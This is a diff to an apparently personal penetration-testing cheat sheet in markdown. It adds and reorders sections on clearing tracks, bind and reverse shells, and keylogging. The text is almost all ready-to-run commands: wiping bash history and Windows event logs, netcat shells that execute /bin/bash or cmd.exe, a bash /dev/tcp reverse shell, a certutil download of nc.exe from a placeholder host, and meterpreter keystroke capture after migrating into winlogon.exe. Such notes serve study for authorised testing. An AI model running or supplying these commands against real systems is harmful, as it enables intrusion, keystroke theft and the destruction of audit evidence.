@@ -771,9 +771,10 @@ i686-w64-mingw32-gcc 9303.c -o exploit_32 -lws2_32
     - [Cron Jobs](#Cron-Jobs)
     - [SSH Keys](#SSH-Keys)
 - Clearing Tracks
-  - [Resource Scripts](#Resource-Scripts)
   - [Linux History](#Linux-History)
+  - [Resource Scripts](#Resource-Scripts)
   - [Windows Event Logs](#Windows-Event-Logs)
+- [Bind and Reverse Shells](#Bind-and-Reverse-Shells)
 - [Keylogging](#Keylogging)
 - [Pivoting](#Pivoting)
 - [Transfer Files](#Transfer-Files)
@@ -918,49 +919,87 @@ meterpreter > getsystem
 - Need to have a 64-bit meterpreter session (session_1).
 - Change `LPORT` to avoid conflict with existing session(s).
 - Set `target` to `1` (Windows x64).
-- `getsystem` works in session_2.
+- `getsystem` works in session_2 but UAC flag was still set - why?
+
+## Maintaining Persistent Access
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-## Cleanup Resource Scripts
-```
-meterpreter > resource <filename>
-```
-
-## Clear Linux History
+## Clearing Tracks
+### Linux History
+[<< Index](#Index)
 ```
 cat /dev/null > ~/.bash_history
 history -c
 ```
 
-## Clear Windows Event Logs
+### Resource Scripts
+[<< Index](#Index)
+```
+meterpreter > resource <filename>
+```
+
+### Windows Event Logs
+[<< Index](#Index)
 ```
 meterpreter > clearev
 ```
 
+## Bind and Reverse Shells
+[<< Index](#Index)
+```
+nc -help
+
+-n : do not resolve hostnames
+-v : verbosity, can be used multiple times
+-l : listen
+-p : local port number
+-u : UDP instead of TCP
+-e : execute command
+```
+```
+cd /usr/share/windows-resources/binaries/
+python -m SimpleHTTPServer 80
+
+certutil -urlcache -f http://<ip>/nc.exe nc.exe
+nc.exe -h
+```
+- Windows does not have `netcat` by default.
+
+### Transferring Files
+[<< Index](#Index)
+```
+nc -nvlp <port> > received.txt
+nc -nv <ip> <port> < sent.txt
+```
+
+### Bind Shells
+[<< Index](#Index)
+```
+nc -nvlp <port> -e /bin/bash
+nc -nv <ip> <port>
+
+nc -nvlp <port> -e cmd.exe
+nc -nv <ip> <port>
+```
+
+### Reverse Shells
+[<< Index](#Index)
+```
+nc -nvlp <port>
+nc -nv <ip> <port> -e /bin/bash
+
+nc -nvlp <port>
+nc -nv <ip> <port> -e cmd.exe
+```
+```
+bash -i >& /dev/tcp/<ip>/<port> 0>&1
+```
+
 ## Keylogging
+[<< Index](#Index)
 ```
 meterpreter > getdesktop
-```
-```
+
 meterpreter > keyscan_start
 meterpreter > keyscan_dump
 meterpreter > keyscan_stop
@@ -968,6 +1007,16 @@ meterpreter > keyscan_stop
 ```
 meterpreter > migrate -N winlogon.exe
 ```
+
+
+
+
+
+
+
+
+
+
 
 ## Linux Local Enumeration
 ### Enumerating System Information
